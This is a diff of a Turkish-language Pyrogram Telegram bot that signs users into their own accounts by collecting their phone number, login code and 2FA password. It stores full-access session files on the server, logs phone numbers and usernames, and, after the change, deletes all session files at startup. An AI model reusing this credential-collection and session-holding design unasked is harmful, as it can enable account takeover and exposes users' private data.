@@ -1,39 +1,38 @@
-# main.py
-import os
-import logging
 import os
 import glob
-
-# Bot klasöründeki bütün .session-journal dosyalarını bul ve sil
-def clear_session_locks():
-    locks = glob.glob("*.session-journal")
-    for lock in locks:
-        try:
-            os.remove(lock)
-            print(f"✅ Kilit açıldı: {lock}")
-        except Exception as e:
-            print(f"⚠️ {lock} silinemedi: {e}")
-
-# Botları başlatmadan hemen önce çağır
-clear_session_locks()
-
-
-
+import logging
+import asyncio
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.errors import (
     SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid, 
     PhoneCodeExpired, FloodWait
 )
+
+# Kendi dosyalarından aldığımız importlar
 from config import API_ID, API_HASH, BOT_TOKEN, BOT_NAME
 from shared import user_data, user_clients
 from userbot import setup_userbot_handlers
 
-# Hataları terminalde takip edebilmek için loglama
+# --- LOGLAMA AYARI ---
 logging.basicConfig(level=logging.ERROR)
 
-# Ana Panel Botu
-bot = Client("login_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+# --- TAM TEMİZLİK FONKSİYONU ---
+def reset_all_sessions():
+    """Bot her başladığında geçmişten kalan tüm kilitleri ve oturumları sıfırlar."""
+    # .session ve .session-journal dosyalarını hedef alıyoruz
+    all_files = glob.glob("*.session") + glob.glob("*.session-journal")
+    
+    if all_files:
+        print(f"🗑️ {len(all_files)} adet eski oturum dosyası temizleniyor...")
+        for file in all_files:
+            try:
+                os.remove(file)
+                print(f"✅ Temizlendi: {file}")
+            except Exception as e:
+                print(f"⚠️ {file} silinemedi: {e}")
+    else:
+        print("✨ Aktif oturum dosyası bulunamadı, sistem temiz.")
 
 # --- LOG TUTMA FONKSİYONU ---
 def log_user_to_file(chat_id, phone, username):
@@ -44,12 +43,19 @@ def log_user_to_file(chat_id, phone, username):
     except Exception as e:
         print(f"Log yazma hatası: {e}")
 
+# --- BOT BAŞLATILMADAN ÖNCE TEMİZLİĞİ ÇALIŞTIR ---
+reset_all_sessions()
+
+# Ana Panel Botu (Login Bot)
+bot = Client("login_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+
+# --- BOT KOMUTLARI VE MANTIK ---
+
 @bot.on_message(filters.command("start") & filters.private)
 async def start_handler(client, message):
     chat_id = message.chat.id
-    
-    # Başlangıçta oturum kontrolü
     session_file = f"session_{chat_id}.session"
+    
     if os.path.exists(session_file):
         text = (
             f"<b>⚠️ Zaten aktif bir oturumunuz bulunuyor!</b>\n\n"
@@ -96,12 +102,10 @@ async def callback_handler(client, callback_query):
 
     elif data == "back_to_main":
         user_data[chat_id]["step"] = None
-        
-        # GÜNCEL KISIM: Geri dönerken oturum kontrolü yapıyoruz
         if os.path.exists(session_file):
             text = (
                 f"<b>⚠️ Zaten aktif bir oturumunuz bulunuyor!</b>\n\n"
-                "<code>UserBot'unuz şu an çalışıyor. Komutları sohbette kullanabilirsiniz.</code>"
+                "<code>UserBot'unuz şu an çalışıyor.</code>"
             )
             buttons = InlineKeyboardMarkup([[InlineKeyboardButton("📜 Komut Rehberi", callback_data="show_commands")]])
             await callback_query.edit_message_text(text, reply_markup=buttons)
@@ -119,11 +123,7 @@ async def callback_handler(client, callback_query):
 
     elif data == "start_login":
         if os.path.exists(session_file):
-            return await callback_query.answer(
-                "⚠️ Zaten aktif bir oturumunuz var!\nYeniden kurmak için dosyayı silmelisiniz.", 
-                show_alert=True
-            )
-
+            return await callback_query.answer("⚠️ Zaten aktif oturum var!", show_alert=True)
         user_data[chat_id]["step"] = "phone"
         await callback_query.edit_message_text(
             "<b>📱 Numara Girişi</b>\n──────────────────────\n<code>Lütfen numaranızı yazın (+90...):</code>", 
@@ -133,9 +133,13 @@ async def callback_handler(client, callback_query):
     elif data == "confirm_phone":
         phone = user_data[chat_id].get("phone")
         session_name = f"session_{chat_id}"
-        await client.edit_message_text(chat_id, main_msg_id, "<code>⏳ Telegram'a bağlanılıyor...</code>")
+        await bot.edit_message_text(chat_id, main_msg_id, "<code>⏳ Telegram'a bağlanılıyor...</code>")
         
-        if session_name in user_clients: del user_clients[session_name]
+        if session_name in user_clients: 
+            try: await user_clients[session_name].disconnect()
+            except: pass
+            del user_clients[session_name]
+            
         user_clients[session_name] = Client(session_name, api_id=API_ID, api_hash=API_HASH)
 
         try:
@@ -143,12 +147,12 @@ async def callback_handler(client, callback_query):
             code_info = await user_clients[session_name].send_code(phone)
             user_data[chat_id].update({"hash": code_info.phone_code_hash, "step": "code"})
             
-            await client.edit_message_text(
+            await bot.edit_message_text(
                 chat_id, main_msg_id, 
                 f"<b>📩 Kod Gönderildi</b>\n──────────────────────\n<code>{phone} numarasına gelen kodu girin:</code>"
             )
         except Exception as e:
-            await client.edit_message_text(chat_id, main_msg_id, f"<code>❌ Hata: {str(e)}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Geri Dön", callback_data="back_to_main")]]))
+            await bot.edit_message_text(chat_id, main_msg_id, f"<code>❌ Hata: {str(e)}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Geri Dön", callback_data="back_to_main")]]))
 
 @bot.on_message(filters.text & filters.private)
 async def login_logic(client, message):
@@ -164,7 +168,7 @@ async def login_logic(client, message):
 
     if step == "phone":
         user_data[chat_id]["phone"] = message.text
-        await client.edit_message_text(
+        await bot.edit_message_text(
             chat_id, main_msg_id, 
             f"<b>🤔 Numara Onayı</b>\n──────────────────────\n<code>{message.text}</code>\nDoğru mu?", 
             reply_markup=InlineKeyboardMarkup([
@@ -175,28 +179,31 @@ async def login_logic(client, message):
 
     elif step == "code":
         clean_code = message.text.replace(" ", "")
-        await client.edit_message_text(chat_id, main_msg_id, "<code>⏳ Doğrulanıyor...</code>")
+        await bot.edit_message_text(chat_id, main_msg_id, "<code>⏳ Doğrulanıyor...</code>")
         try:
             await user_clients[session_name].sign_in(user_data[chat_id]["phone"], user_data[chat_id]["hash"], clean_code)
             await finalize_login(client, chat_id, main_msg_id, session_name)
         except SessionPasswordNeeded:
             user_data[chat_id]["step"] = "password"
-            await client.edit_message_text(chat_id, main_msg_id, "<b>🔐 2FA Gerekli</b>\n──────────────────────\n<code>Bulut şifrenizi girin:</code>")
+            await bot.edit_message_text(chat_id, main_msg_id, "<b>🔐 2FA Gerekli</b>\n──────────────────────\n<code>Bulut şifrenizi girin:</code>")
         except Exception as e:
-            await client.edit_message_text(chat_id, main_msg_id, f"<code>❌ Hata: {str(e)}</code>")
+            await bot.edit_message_text(chat_id, main_msg_id, f"<code>❌ Hata: {str(e)}</code>")
 
     elif step == "password":
         try:
             await user_clients[session_name].check_password(message.text)
             await finalize_login(client, chat_id, main_msg_id, session_name)
         except Exception as e:
-            await client.edit_message_text(chat_id, main_msg_id, f"<code>❌ Şifre Hatalı: {str(e)}</code>")
+            await bot.edit_message_text(chat_id, main_msg_id, f"<code>❌ Şifre Hatalı: {str(e)}</code>")
 
 async def finalize_login(client, chat_id, main_msg_id, session_name):
     user_data[chat_id]["step"] = None
+    
+    # Mevcut bağlantıyı tazele
     if user_clients[session_name].is_connected:
         await user_clients[session_name].disconnect()
     
+    # UserBot handlerlarını kur ve başlat
     user_clients[session_name] = Client(session_name, api_id=API_ID, api_hash=API_HASH)
     setup_userbot_handlers(user_clients[session_name])
     await user_clients[session_name].start()
@@ -204,13 +211,12 @@ async def finalize_login(client, chat_id, main_msg_id, session_name):
     me = await user_clients[session_name].get_me()
     log_user_to_file(chat_id, user_data[chat_id].get("phone"), me.username or me.first_name)
     
-    await client.edit_message_text(
+    await bot.edit_message_text(
         chat_id, main_msg_id, 
         f"<b>🎉 Kurulum Tamamlandı!</b>\n\n<code>Hesap: @{me.username or me.first_name}</code>"
     )
-    await user_clients[session_name].send_message("me", f"✅ <b>{BOT_NAME} Aktif!</b>\nArtık kullanıma hazırım.")
+    await user_clients[session_name].send_message("me", f"✅ <b>{BOT_NAME} Aktif!</b>\nKurulum başarıyla tamamlandı.")
 
 if __name__ == "__main__":
-    print(f"--- {BOT_NAME} BAŞLATILDI ---")
+    print(f"--- {BOT_NAME} SİSTEMİ BAŞLATILDI ---")
     bot.run()
-                     
